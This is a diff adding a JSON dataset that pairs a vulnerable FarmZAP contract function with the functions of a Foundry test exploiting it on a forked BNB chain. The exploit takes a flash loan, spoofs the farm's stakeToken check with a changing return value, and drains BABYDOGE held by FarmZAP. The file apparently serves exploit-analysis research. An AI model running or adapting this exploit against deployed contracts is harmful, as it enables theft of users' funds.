@@ -1,0 +1,121 @@
+[
+  {
+    "contract/interface": "IFarmZAP",
+    "source_type": "victim_contract",
+    "function_name": "buyTokensAndDepositOnBehalf",
+    "original_code": "    function buyTokensAndDepositOnBehalf(\n        IFarm farm,\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path\n    ) external payable returns(uint256) {\n        if (msg.value > 0) {\n            require(address(WBNB) == path[0], \"Input token != WBNB\");\n            require(amountIn == msg.value, \"Invalid msg.value\");\n            WBNB.deposit{value: amountIn}();\n        } else {\n            IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);\n        }\n        address tokenOut = path[path.length - 1];\n        require(tokenOut == farm.stakeToken(), \"Not a stake token\");\n\n        _approveIfRequired(path[0], address(router), amountIn);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amountIn,\n            amountOutMin,\n            path,\n            address(this),\n            block.timestamp + 1200\n        );\n        uint256 received = IERC20(tokenOut).balanceOf(address(this));\n\n        _approveIfRequired(tokenOut, address(farm), received);\n        farm.depositOnBehalf(received, msg.sender);\n\n        emit TokensBoughtAndDeposited (\n            address(farm),\n            msg.sender,\n            path[0],\n            tokenOut,\n            amountIn,\n            received\n        );\n\n        return received;\n    }\n\n\n    /*\n     * @notice Estimates amount of Lp tokens based on input amount\n     * @param amountIn Amount of input tokens\n     * @param path0 Address path to swap to token0\n     * @param path1 Address path to swap to token1\n     * @dev Should be used for front end estimation before input tokens approval\n     */\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "depositOnBehalf",
+    "original_code": "    function depositOnBehalf(uint256 amount, address account) external {}\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        WBNB.approve(address(Radiant), amounts[0] + premiums[0]);\n        WBNB.withdraw(80_000 * 1e18);\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(BABYDOGE);\n        FarmZAP.buyTokensAndDepositOnBehalf{value: 80_000 ether}(IFarm(address(this)), 80_000 * 1e18, 0, path);\n        BABYDOGEToWBNBInPancake();\n        BABYDOGE.transferFrom(address(FarmZAP), address(BABYDOGE), BABYDOGE.balanceOf(address(FarmZAP)) - 1);\n        BABYDOGE.transferFrom(address(FarmZAP), address(this), 1); // tigger sell BABYDOGECOIN and addLiquidity in pancakeSwap\n        WBNBToBABYDOGEInPancake();\n        WBNB.withdraw(0.001 ether);\n        FarmZAP.buyTokensAndDepositOnBehalf{value: 0.001 ether}(IFarm(address(this)), 1e15, 0, path);\n        BABYDOGEToWBNBInFarmZAP();\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_593_354);\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(BABYDOGE), \"BABYDOGE\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(FarmZAP), \"FarmZAP\");\n        cheats.label(address(Radiant), \"Radiant\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "stakeToken",
+    "original_code": "    function stakeToken() external returns (address) {\n        i++;\n        if (i != 3) {\n            return address(BABYDOGE);\n        } else {\n            return address(WBNB);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        deal(address(this), 0);\n        address[] memory assets = new address[](1);\n        assets[0] = address(WBNB);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 80_000 * 1e18;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n        Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(0), 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n",
+    "description": ""
+  }
+]
